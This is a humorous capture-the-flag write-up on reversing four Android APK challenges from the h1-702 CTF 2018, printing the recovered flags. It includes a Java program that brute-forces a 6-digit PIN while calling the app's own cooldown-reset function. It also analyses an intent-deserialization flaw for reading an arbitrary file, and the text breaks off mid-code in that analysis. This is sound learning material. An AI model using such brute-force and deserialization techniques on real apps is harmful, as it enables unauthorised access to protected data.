---
title: "voidmercy - h1 702 ctf 2018"
category: "rev"
subcategory: "vm"
type: "writeup"
tags: ["rev", "custom-vm", "voidmercy", "vm", "reverse-engineering", "h1-702-ctf"]
summary: "rev writeup for \"voidmercy\" from h1 702 ctf - techniques: custom-vm, voidmercy, vm, reverse-engineering, h1-702-ctf."
source:
  name: "perfectblue/ctf-writeups"
  url: "https://github.com/perfectblue/ctf-writeups/blob/db9b964bf35c210567ea508383e91a9c423adaee/2018/h1-702-ctf-2018/voidmercy/README.md"
ctf:
  name: "h1 702 ctf"
  year: 2018
  challenge: "voidmercy"
---

## Source

- **CTF:** h1 702 ctf 2018
- **Challenge:** voidmercy
- **Repository:** [perfectblue/ctf-writeups](https://github.com/perfectblue/ctf-writeups)
- **File:** <https://github.com/perfectblue/ctf-writeups/blob/db9b964bf35c210567ea508383e91a9c423adaee/2018/h1-702-ctf-2018/voidmercy/README.md>

---
# h1-702 CTF

Now this is an android CTF. All of its mobile problems are APKs. To be honest, I didn't know jack about Android before this CTF, so the first thing I did was.

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic0.jpg)

## What are APKs?
APK stands for Another Problem Kid, whose existence serves to drive you crazy. That is my conclusion after this CTF.

But in reality, it's Android Package (Why not AP instead? Everyone loves [AP tests](https://ap.collegeboard.org/)). Really, it's just a bunch of files packaged together in an archive. We can use a software such as [7zip](https://7-zip.org/) to open and extract these files.

Here is what we get:
![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic1.png)

What in the world are all these files? Really, that is a good question. I still don't know what half of them are. Visiting the [Wikipedia](https://en.wikipedia.org/wiki/Android_application_package) page for APKs, we can gain a little background on these files. However, my almighty anime-filled eyes focused on two things: the lib folder and the classes.dex file, because Wikipedia tells us that these are the places where one can find the juicy juicy code of the APK.

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic2.png)

Now we got our filthy hands on the juicy code, but I am lazy. You are probably also lazy. We want the source code. We want READABLE code. Our lord and savior, Wikipedia, tells us that the classes.dex file is ```classes compiled in the dex file format understandable by the Dalvik virtual machine and by the Android Runtime```.

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic3.jpg)

Thus, in hopes of not having to read garbage, we turn towards our second lord and savior, StackOverflow. [This](https://stackoverflow.com/questions/1249973/decompiling-dex-into-java-sourcecode) tells us how to convert classes.dex into Java source! Hooray! [This](https://github.com/Lanchon/haystack/tree/master/tools/dex2jar/dex-tools-2.1-20171001-lanchon) tool is what I used, and [this](http://jd.benow.ca/) is for viewing the resulting java jar file's source code.

Now that we are able to take care of the classes.dex file, we turn to the lib folder. Looking inside, we see many architectures, each with a compiled C native library.

I have done quite a bit of reversing before, so I have good background on this. x86 and x86_64 are the most commonly used architectures, so I chose to use those libraries.

However, sorry to break it to you, but...

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic4.jpg)

After we finish crying, we can use IDA to disassemble the code, and the HexRays plugin to generate pseudocode for analysis. At least it's better than nothing.

Let's not be bored and read code all day right? We can install APKs through Android Studio's AVD Manager and actually see them running. Let me just warn you first though, Android Studio is disgusting. It is at least 15 Gigabytes, which I had to download on 100 Kilobyte/s internet...

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic9.jpg)

Yea, computers are a conspiracy trying to prevent me from solving these challenges.

Anyways, just follow the AVD Manager set-up instructions to get an emulator up and running, then open the APK and click Run! Woohoo, we can actually run stuff now!

Thus, with my ```amazing``` google-fu skills, and some time spent researching, I began the challenges.

## Challenge 1

```
Someone chopped up the flag and hide it through out this challenge! Can you find all the parts and put them back together?
```

After reading this prompt, we must first address a very important issue. Problem Writer, why on earth did you chop up the flag? I had really hoped that this problem was a simple ```grep -r "flag"```

Sadly, life is not so sweet. We were told the flag was "chopped up". In other words, the Problem Writer was trying to cook while being food and sleep deprived, and sucked so hard at it that he/she chopped the flag into many pieces instead of chopping his soylent.

Lets employ our newfound knowledge and power to decompile the classes.dex file in the APK and view it in jd-gui.

After not having touched Java for quite a while, I took a moment to refresh myself in Java by doing what every programmer does.

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic5.png)

Taking a look at the classes, there are really only two that look interesting: MainActivity and FourthPart.

```java
package com.hackerone.mobile.challenge1;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.TextView;

public class MainActivity
  extends AppCompatActivity
{
  static
  {
    System.loadLibrary("native-lib");
  }
  
  void doSomething()
  {
    Log.d("Part 1", "The first part of your flag is: \"flag{so_much\"");
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2131296283);
    ((TextView)findViewById(2131165278)).setText("Reverse the apk!");
    doSomething();
  }
  
  public native void oneLastThing();
  
  public native String stringFromJNI();
}
```

and

```java
package com.hackerone.mobile.challenge1;

public class FourthPart
{
  String eight()
  {
    return "w";
  }
  
  String five()
  {
    return "_";
  }
  
  String four()
  {
    return "h";
  }
  
  String one()
  {
    return "m";
  }
  
  String seven()
  {
    return "o";
  }
  
  String six()
  {
    return "w";
  }
  
  String three()
  {
    return "c";
  }
  
  String two()
  {
    return "u";
  }
}
```

I struggled very hard to analyze these two files. It was very difficult indeed. After staring at MainActivity for a days upon days, I finally realized that the first part of the flag was spoon fed to us!

```
The first part of your flag is: "flag{so_much"
```

Taking a look at FourthPart, I employed my advanced guessing skills to guess that the function names tell us the order to the characters returned by each of these function. Looking at the class name, it really took most of my brain cells working to guess that this was the fourth part of the flag.

```
Fourth part: much_wow
```

Much wow indeed.

Because both the first part of the flag and the fourth had the word "part" somewhere in it, lets try grepping the files for "part."

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic6.png)

Oof. I spy some sweets.

```
This is the second part: "_static_"
```

```
part 3: analysis_
```

Next, I turned to the native library. Lets open it up in IDA. Looking for interesting functions, we see the following:

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic7.png)

Once again utilizing my amazing guessing skills and google-fu prowess, we learn that native libraries can be called using Java through the [Java Native Interface](https://en.wikipedia.org/wiki/Java_Native_Interface). For Android, the function name is the package name separated by underscores.

Being the lazy boi I am, I DECOMPILE the first function and get:

```C
unsigned __int64 __fastcall Java_com_hackerone_mobile_challenge1_MainActivity_stringFromJNI(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rdi
  unsigned __int64 result; // rax
  int v4; // ecx
  __int64 v5; // [rsp+8h] [rbp-20h]
  char v6; // [rsp+10h] [rbp-18h]
  unsigned __int64 v7; // [rsp+18h] [rbp-10h]

  v7 = __readfsqword(0x28u);
  sub_8810(&v5, "This is the second part: \"_static_\"", &v6);
  v1 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 1336LL))(a1, v5);
  v2 = (void *)(v5 - 24);
  if ( (_UNKNOWN *)(v5 - 24) == &unk_2B180 )
    goto LABEL_2;
  if ( &pthread_create )
  {
    if ( _InterlockedExchangeAdd((volatile signed __int32 *)(v5 - 8), 0xFFFFFFFF) > 0 )
      goto LABEL_2;
  }
  else
  {
    v4 = *(_DWORD *)(v5 - 8);
    *(_DWORD *)(v5 - 8) = v4 - 1;
    if ( v4 > 0 )
      goto LABEL_2;
  }
  operator delete(v2);
LABEL_2:
  result = __readfsqword(0x28u);
  if ( result == v7 )
    result = v1;
  return result;
}
```

Too bad we already got the second part of the flag. Boohoo!

Lets explore the other function:

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic8.png)

RIPERINOS. Being the lazy bum I am, I did not even bother to try and read the assembly. It is the first challenge after all right? So instead, lets explore the extremely irregularly named functions in between those two JNI functions:

```C
char cr(void)
{
  return 95;
}
char z(void)
{
  return 97;
}
//...etc
```

Once again, relying upon our advanced guessing skills, I surmise that the functions are returning the ASCII character code for the flag. We can use python's 1337 hacker ```chr()``` function, or this noob's [website](http://asciitable.com) to translate the character code for the last part of the flag.

```
Last part: _and_cool
```

Putting it all together, we recover the chopped flag. Please don't ever practice cooking while you're doing a CTF, or you'll chop up the flag again, Mr/Mrs Problem Writer.

### Flag

flag{so_much_static_analysis_much_wow_and_cool}

### TL;DR

The flag was scattered into 5 parts and spread throughout the APK. First in plain text in decompiled classes.dex, fourth scattered in different functions returing the characters. Third was in plaintext in the file, resources.arsc. Second was in plaintext in the native library. Fifth part was scattered throughout different functions in the native library. Now, I don't have a right to call you a lazy bum because I am very lazy as well, but Mr./Mrs. lazy bum, please read my AMAZING writeup! ;)

## Challenge 2

```
Looks like this app is all locked up. Think you can figure out the combination?
```

From this prompt, we can deduce that the problem writer is a sadist who "locks" stuff up in a ~~sex~~ dungeon.

Okay, but actually, we can be pretty sure that this is the "reverse the code/key" type of problem. So lets install this APK with my painstakingly installed Android Studio.

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic10.png)

We can see that the pin is only 6 digits. That's only 10^6 possibilities. I immediately think to myself, that's EASILY brute forcable, and brute force is the method of choice for lazy people like me. First off, we pray to the ~~sex~~ dungeon god, or the Problem Writer, that the pin is 696969, so we immediately try that pin because clearly that is the pin for intellectuals.

```
06-28 01:58:50.971 3286-3286/com.hackerone.mobile.challenge2 D/PinLock: Pin complete: 696969
06-28 01:58:50.971 3286-3286/com.hackerone.mobile.challenge2 D/TEST: 000000000000000000000000000000007D70E389AC175D277D70E389AC175D27
06-28 01:58:50.972 3286-3286/com.hackerone.mobile.challenge2 I/org.libsodium.jni.NaCl: librarypath=/system/lib64
06-28 01:58:50.974 3286-3286/com.hackerone.mobile.challenge2 D/PROBLEM: Unable to decrypt text
```

Sadly, it did not work :( so lets dive into the code.

```java
package com.hackerone.mobile.challenge2;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import com.andrognito.pinlockview.IndicatorDots;
import com.andrognito.pinlockview.PinLockListener;
import com.andrognito.pinlockview.PinLockView;
import java.nio.charset.StandardCharsets;
import org.libsodium.jni.crypto.SecretBox;
import org.libsodium.jni.encoders.Hex;

public class MainActivity
  extends AppCompatActivity
{
  private static final char[] hexArray = "0123456789ABCDEF".toCharArray();
  String TAG = "PinLock";
  private byte[] cipherText;
  IndicatorDots mIndicatorDots;
  private PinLockListener mPinLockListener = new PinLockListener()
  {
    public void onComplete(String paramAnonymousString)
    {
      Object localObject = MainActivity.this.TAG;
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("Pin complete: ");
      localStringBuilder.append(paramAnonymousString);
      Log.d((String)localObject, localStringBuilder.toString());
      paramAnonymousString = MainActivity.this.getKey(paramAnonymousString);
      Log.d("TEST", MainActivity.bytesToHex(paramAnonymousString));
      paramAnonymousString = new SecretBox(paramAnonymousString);
      localObject = "aabbccddeeffgghhaabbccdd".getBytes();
      try
      {
        localObject = paramAnonymousString.decrypt((byte[])localObject, MainActivity.this.cipherText);
        paramAnonymousString = new java/lang/String;
        paramAnonymousString.<init>((byte[])localObject, StandardCharsets.UTF_8);
        Log.d("DECRYPTED", paramAnonymousString);
      }
      catch (RuntimeException paramAnonymousString)
      {
        Log.d("PROBLEM", "Unable to decrypt text");
        paramAnonymousString.printStackTrace();
      }
    }
    
    public void onEmpty()
    {
      Log.d(MainActivity.this.TAG, "Pin empty");
    }
    
    public void onPinChange(int paramAnonymousInt, String paramAnonymousString)
    {
      String str = MainActivity.this.TAG;
      StringBuilder localStringBuilder = new StringBuilder();
      localStringBuilder.append("Pin changed, new length ");
      localStringBuilder.append(paramAnonymousInt);
      localStringBuilder.append(" with intermediate pin ");
      localStringBuilder.append(paramAnonymousString);
      Log.d(str, localStringBuilder.toString());
    }
  };
  PinLockView mPinLockView;
  
  static
  {
    System.loadLibrary("native-lib");
  }
  
  public static String bytesToHex(byte[] paramArrayOfByte)
  {
    char[] arrayOfChar = new char[paramArrayOfByte.length * 2];
    for (int i = 0; i < paramArrayOfByte.length; i++)
    {
      int j = paramArrayOfByte[i] & 0xFF;
      int k = i * 2;
      arrayOfChar[k] = ((char)hexArray[(j >>> 4)]);
      arrayOfChar[(k + 1)] = ((char)hexArray[(j & 0xF)]);
    }
    return new String(arrayOfChar);
  }
  
  public native byte[] getKey(String paramString);
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2131296283);
    this.cipherText = new Hex().decode("9646D13EC8F8617D1CEA1CF4334940824C700ADF6A7A3236163CA2C9604B9BE4BDE770AD698C02070F571A0B612BBD3572D81F99");
    this.mPinLockView = ((PinLockView)findViewById(2131165263));
    this.mPinLockView.setPinLockListener(this.mPinLockListener);
    this.mIndicatorDots = ((IndicatorDots)findViewById(2131165241));
    this.mPinLockView.attachIndicatorDots(this.mIndicatorDots);
  }
  
  public native void resetCoolDown();
}
```

That's it! Pretty short code. I like that because I am lazy. What we are interested in is the onComplete function, which is when the pin is entered. It is quite simple, it tries to decrypt the text with the pin.

```
localObject = "aabbccddeeffgghhaabbccdd".getBytes();
      try
      {
        localObject = paramAnonymousString.decrypt((byte[])localObject, MainActivity.this.cipherText);
        paramAnonymousString = new java/lang/String;
        paramAnonymousString.<init>((byte[])localObject, StandardCharsets.UTF_8);
        Log.d("DECRYPTED", paramAnonymousString);
      }
      catch (RuntimeException paramAnonymousString)
      {
        Log.d("PROBLEM", "Unable to decrypt text");
        paramAnonymousString.printStackTrace();
      }
//ciphertext:
this.cipherText = new Hex().decode("9646D13EC8F8617D1CEA1CF4334940824C700ADF6A7A3236163CA2C9604B9BE4BDE770AD698C02070F571A0B612BBD3572D81F99");
```

Being the lazy people we are, we can just copy this exact decryption routine for writing the brute force code.

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic11.jpg)

I created a new Android Project in Android Studio, and created a decrypt function with the decrypt code.

```
public void decrypt(String paramAnonymousString) {
    Object asdf = new SecretBox(getKey(paramAnonymousString));

    Object localObject = "aabbccddeeffgghhaabbccdd".getBytes();
    try
    {
        localObject = ((SecretBox)asdf).decrypt((byte[])localObject, cipherText);
        paramAnonymousString = new String((byte[])localObject, StandardCharsets.UTF_8);
        Log.d("DECRYPTED", paramAnonymousString);
    }
    catch (Exception e)
    {
        //Log.d("PROBLEM", "Unable to decrypt text");
        //paramAnonymousString.printStackTrace();
    }
}
```

Then I wrote something simple to iterate all 6 digit numbers.

```
for (int i = 0; i < 1000000; i++) {
    String sice = Integer.toString(i);
    while (sice.length() < 6) {
        sice = "0" + sice;
    }
    //System.out.println(sice);
    decrypt(sice);
}
```

But then I found that it brutes about 50 pins, hangs for a while, then continues. At first I thought this was because of my super crusty potato computer, so I smashed it a couple times to see if it would work better.

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic12.jpg)

Nothing changed... so then I looked back at the decompiled code and saw a godly function presented on a silver plate:

```
public native void resetCoolDown();
```

So I just added this call to the code, waited a while for my potato to finish bruting, then collected the flag!

Final code:

```java
package com.hackerone.mobile.challenge2;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import org.libsodium.jni.crypto.SecretBox;
import org.libsodium.jni.encoders.Hex;

public class MainActivity extends AppCompatActivity {

    static {
        System.loadLibrary("native-lib");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        for (int i = 900000; i < 1000000; i++) {
            String sice = Integer.toString(i);
            while (sice.length() < 6) {
                sice = "0" + sice;
            }
            System.out.println(sice);
            decrypt(sice);
            resetCoolDown();
        }
    }

    public void decrypt(String paramAnonymousString) {
        byte[] cipherText = new Hex().decode("9646D13EC8F8617D1CEA1CF4334940824C700ADF6A7A3236163CA2C9604B9BE4BDE770AD698C02070F571A0B612BBD3572D81F99");

        Object asdf = new SecretBox(getKey(paramAnonymousString));

        Object localObject = "aabbccddeeffgghhaabbccdd".getBytes();
        try
        {
            localObject = ((SecretBox)asdf).decrypt((byte[])localObject, cipherText);
            paramAnonymousString = new String((byte[])localObject, StandardCharsets.UTF_8);
            Log.d("DECRYPTED", paramAnonymousString);
        }
        catch (RuntimeException e)
        {
            //Log.d("PROBLEM", "Unable to decrypt text");
            //e.printStackTrace();
        }
    }

    public native byte[] getKey(String pin);
    public native void resetCoolDown();
}
```

I have to say, I'm quite disappointed in the pin choice. Should've been 696969 clearly.

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic13.jpg)

### Flag

flag{wow_yall_called_a_lot_of_func$}

### TL;DR

Write code to brute force 6 digit pin with their decryption routine.

## Challenge 3

```
We could not find the original apk, but we got this. Can you make sense of it?
```

Honestly, who in the world loses an APK file, but instead finds whatever the heck a .odex and .oat file is?

Lets turn to our best friend... Google!

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic14.png)

This [link](https://forum.xda-developers.com/android/software/guide-how-to-decompile-apks-odex-files-t3325340) tells us that we can decompile these files! Decompiled files for defiled people like me? Perfect. Using the info from that link and the dex2jar tool, I converted that garbage into a .jar file and threw it into jd-gui.

Here is the code for you lazy people who don't want to decompile it (aka all of you).

```java
package com.hackerone.mobile.challenge3;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.text.Editable;
import android.text.TextWatcher;
import android.widget.EditText;
import android.widget.TextView;

public class MainActivity
  extends AppCompatActivity
{
  private static char[] key;
  private EditText editText;
  
  static
  {
    char[] arrayOfChar = new char[13];
    arrayOfChar[0] = 0x74;
    arrayOfChar[1] = 0x68;
    arrayOfChar[2] = 0x69;
    arrayOfChar[3] = 0x73;
    arrayOfChar[4] = 0x5f;
    arrayOfChar[5] = 0x69;
    arrayOfChar[6] = 0x73;
    arrayOfChar[7] = 0x5f;
    arrayOfChar[8] = 0x61;
    arrayOfChar[9] = 0x5f;
    arrayOfChar[10] = 0x6b;
    arrayOfChar[11] = 0x33;
    arrayOfChar[12] = 0x79;
    key = arrayOfChar;
  }
  
  public static boolean checkFlag(String paramString)
  {
    if (paramString.length() == 0) {
      return false;
    }
    if ((paramString.length() > "flag{".length()) && (!paramString.substring(0, "flag{".length()).equals("flag{"))) {
      return false;
    }
    if (paramString.charAt(paramString.length() - 1) != '}') {
      return false;
    }
    Object localObject = hexStringToByteArray(new StringBuilder("kO13t41Oc1b2z4F5F1b2BO33c2d1c61OzOdOtO").reverse().toString().replace("O", "0").replace("t", "7").replace("B", "8").replace("z", "a").replace("F", "f").replace("k", "e"));
    localObject = encryptDecrypt(key, (byte[])localObject);
    return (paramString.length() <= paramString.length()) || (paramString.substring("flag{".length(), paramString.length() - 1).equals(localObject));
  }
  
  private static String encryptDecrypt(char[] paramArrayOfChar, byte[] paramArrayOfByte)
  {
    StringBuilder localStringBuilder = new StringBuilder();
    for (int i = 0; i < paramArrayOfByte.length; i++) {
      localStringBuilder.append((char)(paramArrayOfByte[i] ^ paramArrayOfChar[(i % paramArrayOfChar.length)]));
    }
    return localStringBuilder.toString();
  }
  
  public static byte[] hexStringToByteArray(String paramString)
  {
    int i = paramString.length();
    byte[] arrayOfByte = new byte[i / 2];
    for (int j = 0; j < i; j += 2) {
      arrayOfByte[(j / 2)] = ((byte)(byte)((Character.digit(paramString.charAt(j), 16) << 4) + Character.digit(paramString.charAt(j + 1), 16)));
    }
    return arrayOfByte;
  }
  
  protected void onCreate(final Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2131296283);
    paramBundle = (EditText)findViewById(2131165236);
    paramBundle.addTextChangedListener(new TextWatcher()
    {
      public void afterTextChanged(Editable paramAnonymousEditable) {}
      
      public void beforeTextChanged(CharSequence paramAnonymousCharSequence, int paramAnonymousInt1, int paramAnonymousInt2, int paramAnonymousInt3) {}
      
      public void onTextChanged(CharSequence paramAnonymousCharSequence, int paramAnonymousInt1, int paramAnonymousInt2, int paramAnonymousInt3)
      {
        MainActivity.checkFlag(paramBundle.getText().toString());
      }
    });
  }
}
```

Using every ounce of thinking power I have within me, I surmised that the checkFlag function checks the flag. Wow!

So we just need to reverse the checkFlag function.

If we look at the return check:

```
return (paramString.length() <= paramString.length()) || (paramString.substring("flag{".length(), paramString.length() - 1).equals(localObject));
```

We can see that it is comparing the parameter with localObject, which is:

```
Object localObject = hexStringToByteArray(new StringBuilder("kO13t41Oc1b2z4F5F1b2BO33c2d1c61OzOdOtO").reverse().toString().replace("O", "0").replace("t", "7").replace("B", "8").replace("z", "a").replace("F", "f").replace("k", "e"));
    localObject = encryptDecrypt(key, (byte[])localObject);
```

So in the spirit of our laziness, lets copy the code once again, run it, and see what localObject is! Here is my Java program with copied code. Every line is literally stolen from the decompiled code except for the a single print statement.

```java
class Main {

  private static char[] key;
  
  public static void main(String[] args) {
    char[] arrayOfChar = new char[13];
    arrayOfChar[0] = 0x74;
    arrayOfChar[1] = 0x68;
    arrayOfChar[2] = 0x69;
    arrayOfChar[3] = 0x73;
    arrayOfChar[4] = 0x5f;
    arrayOfChar[5] = 0x69;
    arrayOfChar[6] = 0x73;
    arrayOfChar[7] = 0x5f;
    arrayOfChar[8] = 0x61;
    arrayOfChar[9] = 0x5f;
    arrayOfChar[10] = 0x6b;
    arrayOfChar[11] = 0x33;
    arrayOfChar[12] = 0x79;
    key = arrayOfChar;
    Object localObject = hexStringToByteArray(new StringBuilder("kO13t41Oc1b2z4F5F1b2BO33c2d1c61OzOdOtO").reverse().toString().replace("O", "0").replace("t", "7").replace("B", "8").replace("z", "a").replace("F", "f").replace("k", "e"));
    localObject = encryptDecrypt(key, (byte[])localObject);
    System.out.println(localObject);
  }

  private static String encryptDecrypt(char[] paramArrayOfChar, byte[] paramArrayOfByte)
  {
    StringBuilder localStringBuilder = new StringBuilder();
    for (int i = 0; i < paramArrayOfByte.length; i++) {
      localStringBuilder.append((char)(paramArrayOfByte[i] ^ paramArrayOfChar[(i % paramArrayOfChar.length)]));
    }
    return localStringBuilder.toString();
  }
  
  public static byte[] hexStringToByteArray(String paramString)
  {
    int i = paramString.length();
    byte[] arrayOfByte = new byte[i / 2];
    for (int j = 0; j < i; j += 2) {
      arrayOfByte[(j / 2)] = ((byte)(byte)((Character.digit(paramString.charAt(j), 16) << 4) + Character.digit(paramString.charAt(j + 1), 16)));
    }
    return arrayOfByte;
  }
}
```

Which outputs our flag:

```
secr3t_littl3_th4ng
```

### Flag

flag{secr3t_littl3_th4ng}

### TL;DR

Use baksmali to decompile code, reverse the code by running their code and printing what the flag is being checked against.

## Challenge 4

```
To solve this, you need to write your exploit as an APK.
```

Wow, what a lame and boring challenge prompt. Learn from the other problems will ya?

Seems like we will have to make the program read the flag in ```/data/local/tmp/challenge4``` and exfiltrate it.

Lets run the app first and see what it does. Here is what it looks like:

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic15.png)

Whoops, just kidding. I played that a little too much hehe. Here is what you start with:

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic16.png)

We are the red square and are trying to get to the green square (exit). We can swipe to move. After each maze solved, the maze gets harder. Okay now lets dive into the code.

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic17.png)

Oh boy...

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic18.jpg)

Luckily, the app tells us that the maze functionality was taken from [here](https://github.com/Vitaliy336/Maze).

Here are the classes from the github:

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic19.png)

Because the Problem Writer took the code off of here, and edited it to make it into a CTF challenge, we can be pretty sure that the classes in the challenge APK that wasn't in the github one are of the most interest to us, because they must contain what allows us to solve the challenge!

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic20.jpg)

So instead of reading the whole source code, I focused on BroadcastAnnouncer, GameState, MazeMover, StateControler, and StateLoader, AKA the classes that are different.

Looking in MazeMover, we can see what allows us to interact with the app:

```java
public class MazeMover
{
  public static void onReceive(Context paramContext, Intent paramIntent)
  {
    if (MainActivity.getMazeView() == null)
    {
      Log.i("MazeMover", "Not currently trying to solve the maze");
      return;
    }
    GameManager localGameManager = MainActivity.getMazeView().getGameManager();
    Object localObject = paramIntent.getExtras();
    if (localObject != null) {
      if (paramIntent.hasExtra("get_maze"))
      {
        localObject = new Intent();
        ((Intent)localObject).putExtra("walls", localGameManager.getMaze().getWalls());
        paramIntent = new ArrayList();
        paramIntent.add(Integer.valueOf(localGameManager.getPlayer().getX()));
        paramIntent.add(Integer.valueOf(localGameManager.getPlayer().getY()));
        paramIntent.add(Integer.valueOf(localGameManager.getExit().getX()));
        paramIntent.add(Integer.valueOf(localGameManager.getExit().getY()));
        ((Intent)localObject).putExtra("positions", paramIntent);
        ((Intent)localObject).setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
        paramContext.sendBroadcast((Intent)localObject);
      }
      else if (paramIntent.hasExtra("move"))
      {
        int i = ((Bundle)localObject).getChar("move");
        int j = -1;
        int k = 0;
        int m = k;
        switch (i)
        {
        case 105: 
        default: 
          j = 0;
          m = k;
          break;
        case 108: 
          j = 0;
          m = 1;
          break;
        case 106: 
          j = 1;
          m = k;
          break;
        case 104: 
          m = -1;
          j = 0;
        }
        localObject = new Point(m, j);
        paramIntent = new Intent();
        if (localGameManager.movePlayer((Point)localObject)) {
          paramIntent.putExtra("move_result", "good");
        } else {
          paramIntent.putExtra("move_result", "bad");
        }
        paramIntent.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
        paramContext.sendBroadcast(paramIntent);
      }
      else if (paramIntent.hasExtra("cereal"))
      {
        ((GameState)paramIntent.getSerializableExtra("cereal")).initialize(paramContext);
      }
    }
  }
}
```

Tracing this onReceive function, we find the following in MainActivity:

```java
registerReceiver(new BroadcastReceiver()new IntentFilter
{
  public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
  {
    MazeMover.onReceive(paramAnonymousContext, paramAnonymousIntent);
  }
}, new IntentFilter("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER"));
```

The app sets up a BroadcastReceiver, and passes the Intent to the onReceive function. Doing a little [google-fu](https://developer.android.com/guide/components/broadcasts) tells us that we can broadcast an Intent from another app, and the challenge app will receive it, and perform actions. Intents can contain "extras," which can be thought of as parameters with data. Now we have grounds for a plan. Whatever we do, it must be through the onReceive function.

If we read the code, we can quickly discern that the get_maze extra will return to us the maze and our positions. The move extra will allow us to move our player. What's left is the cereal extra, which by process of elimination, must be our vulnerability of course!

![](https://raw.githubusercontent.com/VoidMercy/CTFs/master/h1-702%20CTF/pic21.jpg)

So this is the problem child, a single line of code:

```java
((GameState)paramIntent.getSerializableExtra("cereal")).initialize(paramContext);
```

We can see from [here](https://developer.android.com/reference/android/content/Intent#getSerializableExtra(java.lang.String)) that we are able to pass a Serialized object through an intent using getSerializableExtra. This means that we can control the variables of the object we pass the challenge app. That sounds like quite the control! Lets see what variables GameState contains.

```java
private static final long serialVersionUID = 1L;
public String cleanupTag;
private Context context;
public int levelsCompleted;
public int playerX;
public int playerY;
public long seed;
public StateController stateController;
```

The most interesting one is stateController of course. Since stateController is also Serializable, that means we can control all of the variables in the passed object as well. Looking at all the classes that implement StateController, we find StateLoader and BroadcastAnnouncer.

The GameState object passed through the intent then calls its initialize function:

```java
public void initialize(Context paramContext)
{
  this.context = paramContext;
  paramContext = (GameState)this.stateController.load(paramContext);
  if (paramContext == null) {
    return;
  }
  this.playerX = paramContext.playerX;
  this.playerY = paramContext.playerY;
  this.seed = paramContext.seed;
  this.levelsCompleted = paramContext.levelsCompleted;
}
```

This then calls the load function of the stateController.

Summary of functionality:
We are able to pass the app a GameState object with a StateController object (either BroadcastAnnouncer or StateLoader). Then, the load() function of the StateController object is called.

Next lets inspect the load() function of BroadcastAnnouncer and StateLoader.

StateLoader:

```java
public Object load(Context paramContext)
{
  Object localObject1 = new byte['Ѐ'];
  try
  {
    Object localObject2 = paramContext.openFileInput(getLocation());
    paramContext = new java/io/BufferedInputStream;
    paramContext.<init>((InputStream)localObject2);
    paramContext.read((byte[])localObject1, 0, localObject1.length);
    paramContext.close();
    try
    {
      paramContext = new java/io/ObjectInputStream;
      localObject2 = new java/io/ByteArrayInputStream;
      ((ByteArrayInputStream)localObject2).<init>((byte[])localObject1);
      paramContext.<init>((InputStream)localObject2);
      localObject1 = paramContext.readObject();
      paramContext.close();
      paramContext = (GameState)localObject1;
    }
    catch (ClassNotFoundException paramContext)
    {
      paramContext.printStackTrace();
    }
    catch (IOException paramContext)
    {
      paramContext.printStackTrace();
    }
    paramContext = null;
    return paramContext;
  }
  catch (IOException paramContext)
  {
    paramContext.printStackTrace();
    return null;
  }
  catch (FileNotFoundException paramContext)
  {
    paramContext.printStackTrace();
  }
  return null;
}
```

It simply loads a GameState object from a saved file. This would be interesting if we could control the saved file, however [openFileInput](https://developer.android.com/reference/android/content/Context.html#openFileInput(java.lang.String) only allows the app's local files, which can't be accessed by other apps. Sad!

Next lets look at BroadcastAnnouncer:

```java
public Object load(Context paramContext)
{
  this.stringVal = "";
  Object localObject1 = new File(this.stringRef);
  try
  {
    paramContext = new java/io/BufferedReader;
    Object localObject2 = new java/io/FileReader;
    ((FileReader)localObject2).<init>((File)localObject1);
    paramContext.<init>((Reader)localObject2);
    for (;;)
    {
      localObject2 = paramContext.readLine();
      if (localObject2 == null) {
        break;
      }
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      ((StringBuilder)localObject1).append(this.stringVal);
      ((StringBuilder)localObject1).append((String)localObject2);
      this.stringVal = ((StringBuilder)localObject1).toString();
    }
    return null;
